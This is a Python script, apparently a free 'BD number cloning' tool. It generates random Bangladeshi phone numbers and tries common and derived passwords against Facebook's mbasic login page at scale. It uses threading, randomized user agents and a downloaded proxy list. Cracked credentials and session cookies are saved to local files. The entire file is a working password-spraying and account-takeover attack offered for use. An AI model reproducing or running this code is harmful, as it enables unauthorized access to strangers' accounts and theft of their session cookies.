import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
logo = ("""\033[1;32m
\033[1;32m╔══════════════════════════════════════════════════════════╗\033[1;93m
\033[1;32m║	         \033[1;93m ─━㋱ASSALAMUALAIKUM㋱━─\033[1;32m	           ║
\033[1;32m╔══════════════════════════════════════════════════════════╗
\033[1;32m║   \033[1;93m  _____  ________      _______ _ \033[1;32m                      ║
\033[1;32m║   \033[1;93m |  __ \|  ____\ \    / /_   _| |     \033[1;32m                 ║
\033[1;32m║   \033[1;93m | |  | | |__   \ \  / /  | | | |     \033[1;32m                 ║
\033[1;32m║   \033[1;93m | |  | |  __|   \ \/ /   | | | |     \033[1;32m                 ║
\033[1;32m║   \033[1;93m | |__| | |____   \  /   _| |_| |____ \033[1;32m                 ║
\033[1;32m║   \033[1;93m |_____/|______|   \/   |_____|______|\033[1;32m                 ║
\033[1;32m╚══════════════════════════════════════════════════════════╝
\033[1;32m╔══════════════════════════════════╗╔══════════════════════╗
\033[1;32m║NOTE : \033[37;41mTHIS TOOLS IS FREE\033[0;m\033[1;32m         ║║        \x1b[1;91m___T_\033[1;32m         ║
\033[1;32m║══════════════════════════════════║║       \x1b[1;91m| o o |\033[1;32m        ║
\033[1;32m║AUTHOR    : DEVIL NAJMUL          ║║       \x1b[1;91m|__-__|\033[1;32m        ║
\033[1;32m║══════════════════════════════════║║       \x1b[1;91m/| []|'\033[1;32m        ║
\033[1;32m║WHATSAPP  : +8801977073308        ║║     \x1b[1;91m()/|___|\()\033[1;32m      ║
\033[1;32m║══════════════════════════════════║║        \x1b[1;91m|_|_|\033[1;32m         ║
\033[1;32m║GITHUB    : N41M01                ║║       \x1b[1;91m|_| |_|\033[1;32m        ║
\033[1;32m║══════════════════════════════════║║                      ║
\033[1;32m║SERVER    : DATA -  WORKING       ║╚══════════════════════╝
\033[1;32m║══════════════════════════════════════════════════════════╗
\033[1;32m║FACEBOOK LINK : \x1b[1;91mhttps://www.facebook.com/N41M01\033[1;32m           ║
\033[1;32m║══════════════════════════════════════════════════════════║
\033[1;32m║FB PAGE LINK  : \x1b[1;91mhttps://www.facebook.com/DEVIL.NAJMUL\033[1;32m     ║
\033[1;32m╚══════════════════════════════════════════════════════════╝\033[1;37m""")


class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print(60*'═')
        print(" [1] BD NUMBER CLONING [cp-ok MIX]")
        print(" [2] BD NUMBER CLONING [ONLY OK]")
        print(" [0] Exit")
        print(60*'═')
        test =input(" [√] Choose : ")
        if test in ["1", "01"]:
            sex1()
        if test in ["2", "02"]:
            sex2()
        if test in [" 0", "00"]:
            exit()
        else:
            exit()

def sex1():
    user=[]
    os.system('clear')
    print(logo)
    print(" BD SIM CODE : 016 017 018 019 013 014")
    print(60*'═')
    kode = input(' [?] BD CODE: \033[0;32m')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    print(60*'\033[1;37m═')
    print(" EXAMPLE  : 10000, 20000, 50000")
    print(60*'═')
    limit = int(input('[?] CRACK YOUR LIMIT : \033[0;32m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(60*'═')
        print(' \033[1;37m[✓] TOTAL IDS :\033[1;92m '+tl)
        print(' \033[1;37m[✓] SARVER ONLY DATA')
        print(' \033[1;37m[✓] FIRST AEROPLANE MODE ON/OFF BEFORE USE')
        print(' \033[1;37m[✓] THE CRACK PROCESS HAS BEEN STARTED')
        print(60*'═')
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh','iloveyou']
            yaari.submit(uff1,uid,pwx,tl)
    print(60*'═')
    print(' [✓] Crack process has been completed')
    print(' [✓] Ids saved in ok.txt,cp.txt')
    print(60*'═')
def uff1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[\033[1;92mNAJMUL\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            'path':'/',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
             'cache-control': 'max-age=0',
             'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Linux; Android 11; Infinix X6816C Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/346.0.0.8.76;]',}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()       
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[UFF 🥵 -OK] {uid} | {ps}")
                print(f"\033[38;5;46m COOKIE [💉]  : {coki}")
                open('/sdcard/DEVIL/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[CP] SORRY BRO")
                open('/sdcard/CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r[\033[1;92mNAJMUL\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m]\r'%(loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
def sex2():
    user=[]
    os.system('clear')
    print(logo)
    print(" BD SIM CODE : 016 017 018 019 013 014")
    print(60*'═')
    kode = input(' [?] BD CODE: \033[0;32m')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    print(60*'\033[1;37m═')
    print(" EXAMPLE  : 10000, 20000, 50000")
    print(60*'═')
    limit = int(input('[?] CRACK YOUR LIMIT : \033[0;32m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(60*'═')
        print(' \033[1;37m[✓] TOTAL IDS :\033[1;92m '+tl)
        print(' \033[1;37m[✓] SARVER ONLY DATA')
        print(' \033[1;37m[✓] FIRST AEROPLANE MODE ON/OFF BEFORE USE')
        print(' \033[1;37m[✓] THE CRACK PROCESS HAS BEEN STARTED')
        print(60*'═')
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh','iloveyou','freefair']
            yaari.submit(uff2,uid,pwx,tl)
    print(60*'═')
    print(' [✓] Crack process has been completed')
    print(' [✓] Ids saved in ok.txt,cp.txt')
    print(60*'═')
def uff2(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[\033[1;92mNAJMUL\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            'path':'/',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
             'cache-control': 'max-age=0',
             'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Linux; Android 11; Infinix X6816C Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/346.0.0.8.76;]',}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[UFF 🥵 -OK] {uid} | {ps}")
                print(f"\033[38;5;46m COOKIE [💉]  : {coki}")
                open('/sdcard/DEVIL/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r[\033[1;92mNAJMUL\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m]\r'%(loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
